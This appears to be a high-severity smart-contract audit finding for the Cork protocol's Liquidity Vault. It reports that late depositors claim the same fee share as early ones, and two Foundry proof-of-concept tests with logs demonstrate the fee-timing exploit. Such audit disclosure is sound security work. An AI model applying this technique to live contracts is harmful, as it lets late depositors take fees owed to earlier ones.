Colossal Magenta Elk

High

# LV token holders receive proportional fees, when they shouldn't

### Summary

The Corc protocol claims that the LV token holders should accrue fees that the protocol generates, from the docs: *In our design we envision several mechanisms through which the Liquidity Vault will generate revenues. Some of these are from protocol fees that will flow to the Liquidity Vault and accrue to Liquidity Vault tokenholders.* However, the fee accrual is incorrect, a user can deposit just before fees are about to be distributed to LV holders, and still receive the same amount of fees as a user who deposited tokens in the beginning. There is one LV token per RA:PA pair, however the CT and DS tokens expire and there may be several CT and DS tokens issued by the protocol. Users can mint an LV token via the [Vault::depositLv()](https://github.com/sherlock-audit/2024-08-cork-protocol/blob/main/Depeg-swap/contracts/core/Vault.sol#L33-L37) function, by depositing the corresponding RA asset. The first issue is that if User A mints a LV token, and request to redeem it, then some fees from swapping in the AMM pair for the CT and RA token are generated, or the protocol collects fees from users utilizing its functionality, then a User B mints a LV token, and request to redeem it, both users will accrues the same amount of fees generated by the protocol, when this shouldn't be the case. As the first users has had his request for redeem for a much longer period, risking the price of the RA token dropping significantly, while User B may just call the [Vault::depositLv()](https://github.com/sherlock-audit/2024-08-cork-protocol/blob/main/Depeg-swap/contracts/core/Vault.sol#L33-L37) function the last block before the CT and DS tokens expire, and request a redeem immediately. Then in the next block when the CT and DS tokens have already expired he can claim the same amount of fees as User A, this is demonstrated in the first POC. To better illustrate the second problem consider the following example
-  User A and User B minted LV tokens while the first issued CT and DS tokens were still not expired
-  The UniV2 pair generated some fees
- The protocol collects fees, from users utilizing its functionality
-  The issued CT and DS tokens expired
-  The protocol issued new CT and DS tokens
-  User C mints some LV tokens
-  The UniV2 pair generates some more fees, 

The fees will be split equally between all the users (of course taking into account the amount of LV tokens they hold).

### Root Cause

The protocol doesn't implement any mechanism to track when users minted LV tokens, or when they requested a redemption of their LV tokens, or what rewards were accrued to the current LV holders.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Fees are distrusted incorrectly, users who have held LV tokens since the beginning will receive an equal amount of fees with users who deposit much later, even if no fees are generated by the protocol since the last user deposited. The last users to deposit are effectively stealing fees from the users who deposited earlier.

### PoC
[Gist](https://gist.github.com/AtanasDimulski/3f9bfc84c63e1c977b877613b644c0e2)
After following the steps in the above mentioned [gist](https://gist.github.com/AtanasDimulski/3f9bfc84c63e1c977b877613b644c0e2) add the following tests to the ``AuditorTests.t.sol`` file:

<details>
  <summary>POC 1</summary>

```solidity
    function test_IncorrectFeeAccrural() public {
        vm.startPrank(alice);
        WETH.mint(alice, 1e18);
        WETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(id, 1e18);
        Asset(lvAddress).approve(address(moduleCore), type(uint256).max);
        moduleCore.requestRedemption(id, 1e18);
        vm.stopPrank();

        /// @notice add 1e18 WETH to the amm pair, imagine this is generated from fees
        IUniswapV2Pair univ2Pair = flashSwapRouter.getUniV2pair(id, 1);
        WETH.mint(address(univ2Pair), 1e18);

        vm.startPrank(bob);
        WETH.mint(bob, 1e18);
        WETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(id, 1e18);
        Asset(lvAddress).approve(address(moduleCore), type(uint256).max);
        moduleCore.requestRedemption(id, 1e18);
        vm.stopPrank();

        /// @notice skip 1100 seconds so the CT and DS tokens expire
        skip(1100);

        vm.startPrank(alice);
        console2.log("WETH balance of alice before she redeems: ", WETH.balanceOf(alice));
        moduleCore.redeemExpiredLv(id, alice, 1e18);
        console2.log("WETH balance of alice after she has redeemed: ", WETH.balanceOf(alice));
        vm.stopPrank();

        vm.startPrank(bob);
        console2.log("WETH balance of bob before he redeems: ", WETH.balanceOf(bob));
        moduleCore.redeemExpiredLv(id, bob, 1e18);
        console2.log("WETH balance of bob after he has redeemed: ", WETH.balanceOf(bob));
        assertEq(WETH.balanceOf(alice), WETH.balanceOf(bob));
        vm.stopPrank();
    }
```

```solidity
Logs:
  WETH balance of alice before she redeems:  0
  WETH balance of alice after she has redeemed:  1499999999999998497
  WETH balance of bob before he redeems:  0
  WETH balance of bob after he has redeemed:  1499999999999998497
```

To run the test use: ``forge test -vvv --mt test_IncorrectFeeAccrural``
</details>

<details>
  <summary>POC 2</summary>

```solidity
    function test_IncorrectFeeAccruralBetweenDSIssuings() public {
        vm.startPrank(alice);
        WETH.mint(alice, 1e18);
        WETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(id, 1e18);
        Asset(lvAddress).approve(address(moduleCore), type(uint256).max);
        moduleCore.requestRedemption(id, 1e18);
        vm.stopPrank();

        /// @notice add 1e18 WETH to the amm pair, imagine this is generated from fees
        IUniswapV2Pair univ2Pair = flashSwapRouter.getUniV2pair(id, 1);
        WETH.mint(address(univ2Pair), 1e18);

        vm.startPrank(bob);
        WETH.mint(bob, 1e18);
        WETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(id, 1e18);
        Asset(lvAddress).approve(address(moduleCore), type(uint256).max);
        moduleCore.requestRedemption(id, 1e18);
        vm.stopPrank();

        vm.startPrank(owner);
        /// @notice the first issuance of DS and Ct tokens expires
        skip(1100);
        corkConfig.issueNewDs(id, block.timestamp + expiry, 1e18, 5e18);
        vm.stopPrank();

        vm.startPrank(tom);
        WETH.mint(tom, 1e18);
        WETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositLv(id, 1e18);
        Asset(lvAddress).approve(address(moduleCore), type(uint256).max);
        moduleCore.requestRedemption(id, 1e18);
        vm.stopPrank();

        /// @notice add 1e18 WETH to the amm pair, imagine this is generated from fees
        WETH.mint(address(univ2Pair), 0.3e18);
        skip(1100);

        vm.startPrank(alice);
        console2.log("WETH balance of alice before she redeems: ", WETH.balanceOf(alice));
        moduleCore.redeemExpiredLv(id, alice, 1e18);
        console2.log("WETH balance of alice after she has redeemed: ", WETH.balanceOf(alice));
        vm.stopPrank();
        
        vm.startPrank(bob);
        console2.log("WETH balance of bob before he redeems: ", WETH.balanceOf(bob));
        moduleCore.redeemExpiredLv(id, bob, 1e18);
        console2.log("WETH balance of bob after he has redeemed: ", WETH.balanceOf(bob));
        assertEq(WETH.balanceOf(alice), WETH.balanceOf(bob));
        vm.stopPrank();

        vm.startPrank(tom);
        console2.log("WETH balance of tom before he redeems: ", WETH.balanceOf(tom));
        moduleCore.redeemExpiredLv(id, tom, 1e18);
        console2.log("WETH balance of tom after he has redeemed: ", WETH.balanceOf(tom));
        assertEq(WETH.balanceOf(alice), WETH.balanceOf(tom));
        vm.stopPrank();
    }
```

```solidity
Logs:
  WETH balance of alice before she redeems:  0
  WETH balance of alice after she has redeemed:  1333333333333331663
  WETH balance of bob before he redeems:  0
  WETH balance of bob after he has redeemed:  1333333333333331663
  WETH balance of tom before he redeems:  0
  WETH balance of tom after he has redeemed:  1333333333333331663
```

To run the test use: ``forge test -vvv --mt test_IncorrectFeeAccruralBetweenDSIssuings``
</details>

### Mitigation

_No response_